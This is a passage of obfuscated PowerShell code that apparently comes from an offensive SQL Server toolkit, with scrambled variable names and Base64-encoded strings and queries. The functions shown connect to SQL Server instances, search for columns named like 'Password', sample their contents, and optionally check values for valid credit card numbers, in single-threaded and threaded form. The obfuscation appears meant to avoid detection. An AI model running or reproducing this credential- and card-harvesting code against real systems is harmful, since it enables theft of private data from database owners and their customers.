VwBIAEUATgAgAEwARQBOACgAdAAuAFQAQQBCAEwARQBfAE4AQQBNAEUAKQAgAC0AIABMAEUATgAoAFIARQBQAEwAQQBDAEUAKAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQAsACcAIwAnACwAJwAnACkAKQAgAD0AIAAxACAAVABIAEUATgAgADEAIABFAEwAUwBFACAAMAAgAEUATgBEACkAIAA9ACAAMQAgAFQASABFAE4AIAAnAFQAYQBiAGwAZQBWAGEAcgBpAGEAYgBsAGUAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUAIAB0AC4AVABBAEIATABFAF8AVABZAFAARQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAAgAEEAUwAgAFsAVABhAGIAbABlAFQAeQBwAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMALgBDAE8ATABVAE0ATgBfAE4AQQBNAEUAIABhAHMAIABbAEMAbwBsAHUAbQBuAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMALgBEAEEAVABBAF8AVABZAFAARQAgAGEAcwAgAFsAQwBvAGwAdQBtAG4ARABhAHQAYQBUAHkAcABlAF0ALAANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIABjAC4AQwBIAEEAUgBBAEMAVABFAFIAXwBNAEEAWABJAE0AVQBNAF8ATABFAE4ARwBUAEgAIABhAHMAIABbAEMAbwBsAHUAbQBuAE0AYQB4AEwAZQBuAGcAdABoAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAHQALgBpAHMAXwBtAHMAXwBzAGgAaQBwAHAAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwB0AC4AaQBzAF8AcAB1AGIAbABpAHMAaABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAHQALgBpAHMAXwBzAGMAaABlAG0AYQBfAHAAdQBiAGwAaQBzAGgAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwB0AC4AYwByAGUAYQB0AGUAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwB0AC4AbQBvAGQAaQBmAHkAXwBkAGEAdABlACAAQQBTACAAbQBvAGQAaQBmAGkAZQBkAF8AZABhAHQAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAFsAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9AF0ALgBbAEkATgBGAE8AUgBNAEEAVABJAE8ATgBfAFMAQwBIAEUATQBBAF0ALgBbAFQAQQBCAEwARQBTAF0AIAB0AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABKAE8ASQBOACAAcwB5AHMALgB0AGEAYgBsAGUAcwAgAHMAdAAgAE8ATgAgAHQALgBUAEEAQgBMAEUAXwBOAEEATQBFACAAPQAgAHMAdAAuAG4AYQBtAGUAIABBAE4ARAAgAHQALgBUAEEAQgBMAEUAXwBTAEMASABFAE0AQQAgAD0AIABPAEIASgBFAEMAVABfAFMAQwBIAEUATQBBAF8ATgBBAE0ARQAoAHMAdAAuAG8AYgBqAGUAYwB0AF8AaQBkACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEoATwBJAE4AIABzAHkAcwAuAG8AYgBqAGUAYwB0AHMAIABzACAATwBOACAAcwB0AC4AbwBiAGoAZQBjAHQAXwBpAGQAIAA9ACAAcwAuAG8AYgBqAGUAYwB0AF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABMAEUARgBUACAASgBPAEkATgAgAHMAeQBzAC4AZQB4AHQAZQBuAGQAZQBkAF8AcAByAG8AcABlAHIAdABpAGUAcwAgAGUAcAAgAE8ATgAgAHMALgBvAGIAagBlAGMAdABfAGkAZAAgAD0AIABlAHAALgBtAGEAagBvAHIAXwBpAGQAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAE4ARAAgAGUAcAAuAG0AaQBuAG8AcgBfAGkAZAAgAD0AIAAwACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEoATwBJAE4AIABbACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQBdAC4AWwBJAE4ARgBPAFIATQBBAFQASQBPAE4AXwBTAEMASABFAE0AQQBdAC4AWwBDAE8ATABVAE0ATgBTAF0AIABjACAATwBOACAAdAAuAFQAQQBCAEwARQBfAE4AQQBNAEUAIAA9ACAAYwAuAFQAQQBCAEwARQBfAE4AQQBNAEUAIABBAE4ARAAgAHQALgBUAEEAQgBMAEUAXwBTAEMASABFAE0AQQAgAD0AIABjAC4AVABBAEIATABFAF8AUwBDAEgARQBNAEEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAFIARQAgADEAPQAxAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwAvAFwALwA9AFwAXwAvAD0APQBcAF8AXwBfAF8ALwA9AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewAvAD0AXABfAC8AXABfAC8AXAAvAFwALwBcAF8ALwBcAC8AfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AF8ALwA9AFwALwA9AFwALwA9AFwALwA9AFwALwA9AFwALwB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAFIARABFAFIAIABCAFkAIAB0AC4AVABBAEIATABFAF8AQwBBAFQAQQBMAE8ARwAsACAAdAAuAFQAQQBCAEwARQBfAFMAQwBIAEUATQBBACwAIAB0AC4AVABBAEIATABFAF8ATgBBAE0ARQAsACAAYwAuAE8AUgBEAEkATgBBAEwAXwBQAE8AUwBJAFQASQBPAE4A')))
            ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
            ${/=\/\_/\/=\/\____} = ${/=\/\_/\/=\/\____} + ${/=\_____/\/\/=\__}
        }
    }
    End
    {
        ${/=\/\_/\/=\/\____}
    }
}
Function Get-SQLColumnSampleData
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$Keywords = 'Password',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$ValidateCC,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGIAbABlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGwAdQBtAG4A'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AcABsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAHcAQwBvAHUAbgB0AA=='))))
        if($ValidateCC)
        {
            $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAQwA='))))
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAA==')))
            }
            Return
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAUwBFAEEAUgBDAEgAIABEAEEAVABBACAAQgBZACAAQwBPAEwAVQBNAE4A')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABTAHUAYwBjAGUAcwBzAC4A')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABjAG8AbAB1AG0AbgAgAG4AYQBtAGUAcwAgAHQAaABhAHQAIABtAGEAdABjAGgAIABjAHIAaQB0AGUAcgBpAGEALgAuAC4A')))
            }
            if($NoDefaults)
            {
                ${_/=\/=\/\/==\/\_/} = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
            }else
            {
                ${_/=\/=\/\/==\/\_/} = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
            }
        }
        if(${_/=\/=\/\/==\/\_/})
        {
            ${_/=\/=\/\/==\/\_/}|
            % -Process {
                ${__/\/\/\/\_/====\} = $_.DatabaseName
                ${____/==\_/\_/\_/\} = $_.SchemaName
                ${_/====\___/\____/} = $_.TableName
                ${_/=\_/=\_/=\_/=\/} = $_.ColumnName
                ${/==\______/===\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwBfAC8AXAAvAFwALwBcAC8AXABfAC8APQA9AD0APQBcAH0AXQAuAFsAJAB7AF8AXwBfAF8ALwA9AD0AXABfAC8AXABfAC8AXABfAC8AXAB9AF0ALgBbACQAewBfAC8APQA9AD0APQBcAF8AXwBfAC8AXABfAF8AXwBfAC8AfQBdAC4AWwAkAHsAXwAvAD0AXABfAC8APQBcAF8ALwA9AFwAXwAvAD0AXAAvAH0AXQA=')))
                ${/\____/\__/====\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwBfAC8AXAAvAFwALwBcAC8AXABfAC8APQA9AD0APQBcAH0AXQAuAFsAJAB7AF8AXwBfAF8ALwA9AD0AXABfAC8AXABfAC8AXABfAC8AXAB9AF0ALgBbACQAewBfAC8APQA9AD0APQBcAF8AXwBfAC8AXABfAF8AXwBfAC8AfQBdAA==')))
                $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAIAAkAHsAXwBfAC8AXAAvAFwALwBcAC8AXABfAC8APQA9AD0APQBcAH0AOwAgAFMARQBMAEUAQwBUACAAVABPAFAAIAAkAFMAYQBtAHAAbABlAFMAaQB6AGUAIABbACQAewBfAC8APQBcAF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAC8AfQBdACAARgBSAE8ATQAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAC8APQA9AD0APQBcAF8AfQAgAFcASABFAFIARQAgAFsAJAB7AF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAF8ALwA9AFwALwB9AF0AIABpAHMAIABuAG8AdAAgAG4AdQBsAGwA')))
                ${_/==\__/\/==\_/=\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAIAAkAHsAXwBfAC8AXAAvAFwALwBcAC8AXABfAC8APQA9AD0APQBcAH0AOwAgAFMARQBMAEUAQwBUACAAYwBvAHUAbgB0ACgAQwBBAFMAVAAoAFsAJAB7AF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAF8ALwA9AFwALwB9AF0AIABhAHMAIABWAEEAUgBDAEgAQQBSACgAMgAwADAAKQApACkAIABhAHMAIABOAHUAbQBSAG8AdwBzACAARgBSAE8ATQAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAC8APQA9AD0APQBcAF8AfQAgAFcASABFAFIARQAgAFsAJAB7AF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAF8ALwA9AFwALwB9AF0AIABpAHMAIABuAG8AdAAgAG4AdQBsAGwA')))
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEMAbwBsAHUAbQBuACAAbQBhAHQAYwBoADoAIAAkAHsALwA9AD0AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwAvAH0A')))
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFMAZQBsAGUAYwB0AGkAbgBnACAAJABTAGEAbQBwAGwAZQBTAGkAegBlACAAcgBvAHcAcwAgAG8AZgAgAGQAYQB0AGEAIABzAGEAbQBwAGwAZQAgAGYAcgBvAG0AIABjAG8AbAB1AG0AbgAgACQAewAvAD0APQBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAC8AfQAuAA==')))
                }
                ${___/===\/=\/=\___} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query ${_/==\__/\/==\_/=\} -SuppressVerbose | select -Property NumRows -ExpandProperty NumRows
                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                select -ExpandProperty ${_/=\_/=\_/=\_/=\/} |
                % -Process {
                    if($ValidateCC)
                    {
                        ${__/=\_/\/\_/=\__/} = 0
                        if([uint64]::TryParse($_,[ref]${__/=\_/\/\_/=\__/}))
                        {
                            ${/==\/===\/==\/=\_} = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                        }
                        else
                        {
                            ${/==\/===\/==\/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGwAcwBlAA==')))
                        }
                        $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${__/\/\/\/\_/====\}, ${____/==\_/\_/\_/\}, ${_/====\___/\____/}, ${_/=\_/=\_/=\_/=\/}, $_, ${___/===\/=\/=\___}, ${/==\/===\/==\/=\_})
                    }
                    else
                    {
                        $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${__/\/\/\/\_/====\}, ${____/==\_/\_/\_/\}, ${_/====\___/\____/}, ${_/=\_/=\_/=\_/=\/}, $_, ${___/===\/=\/=\___})
                    }
                }
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwAgAGMAbwBsAHUAbQBuAHMAIAB3AGUAcgBlACAAZgBvAHUAbgBkACAAdABoAGEAdAAgAG0AYQB0AGMAaABlAGQAIAB0AGgAZQAgAHMAZQBhAHIAYwBoAC4A')))
            }
        }
        if( -not $SuppressVerbose)
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBOAEQAIABTAEUAQQBSAEMASAAgAEQAQQBUAEEAIABCAFkAIABDAE8ATABVAE0ATgA=')))
        }
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Get-SQLColumnSampleDataThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$Keywords = 'Password',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$ValidateCC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGIAbABlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGwAdQBtAG4A'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AcABsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAHcAQwBvAHUAbgB0AA=='))))
        if($ValidateCC)
        {
            $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAQwA='))))
        }
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if(-not ${__/\_/=\/==\_/=\_})
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAA==')))
                }
                Return
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAUwBFAEEAUgBDAEgAIABEAEEAVABBACAAQgBZACAAQwBPAEwAVQBNAE4A')))
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABTAHUAYwBjAGUAcwBzAC4A')))
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABjAG8AbAB1AG0AbgAgAG4AYQBtAGUAcwAgAHQAaABhAHQAIABtAGEAdABjAGgAIABjAHIAaQB0AGUAcgBpAGEALgAuAC4A')))
                }
                if($NoDefaults)
                {
                    ${_/=\/=\/\/==\/\_/} = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
                }else
                {
                    ${_/=\/=\/\/==\/\_/} = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
                }
            }
            if(${_/=\/=\/\/==\/\_/})
            {
                ${_/=\/=\/\/==\/\_/}|
                % -Process {
                    ${__/\/\/\/\_/====\} = $_.DatabaseName
                    ${____/==\_/\_/\_/\} = $_.SchemaName
                    ${_/====\___/\____/} = $_.TableName
                    ${_/=\_/=\_/=\_/=\/} = $_.ColumnName
                    ${/==\______/===\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwBfAC8AXAAvAFwALwBcAC8AXABfAC8APQA9AD0APQBcAH0AXQAuAFsAJAB7AF8AXwBfAF8ALwA9AD0AXABfAC8AXABfAC8AXABfAC8AXAB9AF0ALgBbACQAewBfAC8APQA9AD0APQBcAF8AXwBfAC8AXABfAF8AXwBfAC8AfQBdAC4AWwAkAHsAXwAvAD0AXABfAC8APQBcAF8ALwA9AFwAXwAvAD0AXAAvAH0AXQA=')))
                    ${/\____/\__/====\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwBfAC8AXAAvAFwALwBcAC8AXABfAC8APQA9AD0APQBcAH0AXQAuAFsAJAB7AF8AXwBfAF8ALwA9AD0AXABfAC8AXABfAC8AXABfAC8AXAB9AF0ALgBbACQAewBfAC8APQA9AD0APQBcAF8AXwBfAC8AXABfAF8AXwBfAC8AfQBdAA==')))
                    $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAIAAkAHsAXwBfAC8AXAAvAFwALwBcAC8AXABfAC8APQA9AD0APQBcAH0AOwAgAFMARQBMAEUAQwBUACAAVABPAFAAIAAkAFMAYQBtAHAAbABlAFMAaQB6AGUAIABbACQAewBfAC8APQBcAF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAC8AfQBdACAARgBSAE8ATQAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAC8APQA9AD0APQBcAF8AfQAgAFcASABFAFIARQAgAFsAJAB7AF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAF8ALwA9AFwALwB9AF0AIABpAHMAIABuAG8AdAAgAG4AdQBsAGwA')))
                    ${_/==\__/\/==\_/=\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAIAAkAHsAXwBfAC8AXAAvAFwALwBcAC8AXABfAC8APQA9AD0APQBcAH0AOwAgAFMARQBMAEUAQwBUACAAYwBvAHUAbgB0ACgAQwBBAFMAVAAoAFsAJAB7AF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAF8ALwA9AFwALwB9AF0AIABhAHMAIABWAEEAUgBDAEgAQQBSACgAMgAwADAAKQApACkAIABhAHMAIABOAHUAbQBSAG8AdwBzACAARgBSAE8ATQAgACQAewAvAFwAXwBfAF8AXwAvAFwAXwBfAC8APQA9AD0APQBcAF8AfQAgAFcASABFAFIARQAgAFsAJAB7AF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAF8ALwA9AFwALwB9AF0AIABpAHMAIABuAG8AdAAgAG4AdQBsAGwA')))
                    if( -not $SuppressVerbose)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEMAbwBsAHUAbQBuACAAbQBhAHQAYwBoADoAIAAkAHsALwA9AD0AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwAvAH0A')))
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFMAZQBsAGUAYwB0AGkAbgBnACAAJABTAGEAbQBwAGwAZQBTAGkAegBlACAAcgBvAHcAcwAgAG8AZgAgAGQAYQB0AGEAIABzAGEAbQBwAGwAZQAgAGYAcgBvAG0AIABjAG8AbAB1AG0AbgAgACQAewAvAD0APQBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAC8AfQAuAA==')))
                    }
                    ${___/===\/=\/=\___} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query ${_/==\__/\/==\_/=\} -SuppressVerbose | select -Property NumRows -ExpandProperty NumRows
                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                    select -ExpandProperty ${_/=\_/=\_/=\_/=\/} |
                    % -Process {
                        if($ValidateCC)
                        {
                            ${__/=\_/\/\_/=\__/} = 0
                            if([uint64]::TryParse($_,[ref]${__/=\_/\/\_/=\__/}))
                            {
                                ${/==\/===\/==\/=\_} = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                            }
                            else
                            {
                                ${/==\/===\/==\/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGwAcwBlAA==')))
                            }
